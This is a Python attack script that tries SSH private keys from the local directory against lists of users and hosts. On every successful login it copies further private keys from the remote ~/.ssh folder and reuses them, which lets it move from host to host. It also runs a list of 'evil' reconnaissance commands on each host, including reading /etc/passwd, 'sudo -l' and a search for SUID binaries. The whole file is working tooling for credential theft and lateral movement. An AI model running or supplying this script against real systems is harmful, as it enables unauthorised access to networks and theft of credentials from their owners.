#!/usr/bin/env python

import os
import re
import subprocess

# Regular expression to detect login suggestion message
re_login = re.compile(r'Please login as the user "(.*)" rather than')

# Example extended "evil" commands
evil_commands = [
    # System Information
    'uname -a',
    'cat /etc/os-release',
    'df -h',
    'free -m',
    'uptime',
    
    # Network Information
    'ifconfig',
    'netstat -tuln',
    'ss -tuln',
    'ip route',
    
    # User Information
    'who',
    'w',
    'last',
    'cat /etc/passwd',
    'cat /etc/group',
    'sudo -l',
    
    # File and Directory Information
    'ls -la /home',
    'ls -la /root',
    'find / -perm -4000 2>/dev/null',
    
    # Services and Processes
    'ps aux',
    'systemctl list-units --type=service',
    'crontab -l',
    
    # Security Information
    'iptables -L',
    'selinuxenabled && echo SELinux is enabled || echo SELinux is disabled',
    'getenforce'
]

def execute_ssh_command(user, key, host, command):
    '''
    Execute the specified command on the host.
    '''
    cmd = f'ssh -i {key} {user}@{host} "{command}"'
    try:
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        resp = result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        resp = e.stderr.decode('utf-8')

    # Check for common errors and return None if any detected
    if 'Permission denied' in resp:
        return None

    # Return the command output
    return resp

def perform_actions(user, key, host):
    '''
    Execute a series of predefined commands on the host.
    '''
    for cmd in evil_commands:
        resp = execute_ssh_command(user, key, host, cmd)
        if resp is not None:
            print(resp)

def retrieve_ssh_key(user, key, host, file):
    '''
    Attempt to download a new SSH key from the host.
    '''
    print(f'[*] Attempting to download key {file}')
    src = f'{user}@{host}:.ssh/{file}'
    dst = f'{user}-{host}_{file}'
    cmd = f'scp -i {key} {src} {dst}'
    
    try:
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        resp = result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        resp = e.stderr.decode('utf-8')

    # Check for common errors and print message
    if 'not a regular file' in resp:
        print(f'[-] Unable to download key file {dst}\n')
    else:
        print(f'[+] New key file {dst} downloaded.\n')
        if dst not in new_keys:
            new_keys.append(dst)

def try_login_with_key(user, key, host):
    '''
    Attempt to login to the host with the provided user and key.
    '''
    print(f'[*] Trying {key} on {user}@{host}')
    resp = execute_ssh_command(user, key, host, 'ls ~/.ssh')
    if resp is None:
        print(f'[-] Login to {user}@{host} with key {key} failed.\n')
        return

    m = re_login.search(resp)
    if m:
        print(f'[-] Login to {user}@{host} with key {key} failed: {m.group(0)}\n')
    else:
        print(f'[+] Login to {user}@{host} with key {key} succeeded')
        for line in resp.split('\n'):
            if line in ['authorized_keys', 'known_hosts', 'config', '']:
                continue
            retrieve_ssh_key(user, key, host, line)
        perform_actions(user, key, host)

def load_ssh_keys():
    '''
    Load SSH keys from the current directory.
    '''
    keys = []
    print('[*] Loading SSH keys from current directory.')
    for file in os.listdir('.'):
        if file.endswith('.pub') or file in ['users', 'hosts', os.path.basename(__file__)]:
            continue
        keys.append(file)

    return keys

def load_user_accounts():
    '''
    Load user accounts from the 'users' file.
    '''
    users = []
    print('[*] Loading user accounts.')
    with open('users', 'r') as f:
        for line in f:
            if line.strip():
                users.append(line.strip())

    return users

def load_hostnames():
    '''
    Load hosts from the 'hosts' file.
    '''
    hosts = []
    print('[*] Loading hosts.')
    with open('hosts', 'r') as f:
        for line in f:
            if line.strip():
                hosts.append(line.strip())

    return hosts

if __name__ == '__main__':
    users = load_user_accounts()
    hosts = load_hostnames()
    initial_keys = load_ssh_keys()
    new_keys = []

    print('[*] Testing loaded keys.')
    for key in initial_keys:
        for host in hosts:
            for user in users:
                try_login_with_key(user, key, host)

    print('[*] Testing discovered keys.')
    while new_keys:
        key = new_keys.pop(0)
        for host in hosts:
            for user in users:
                try_login_with_key(user, key, host)
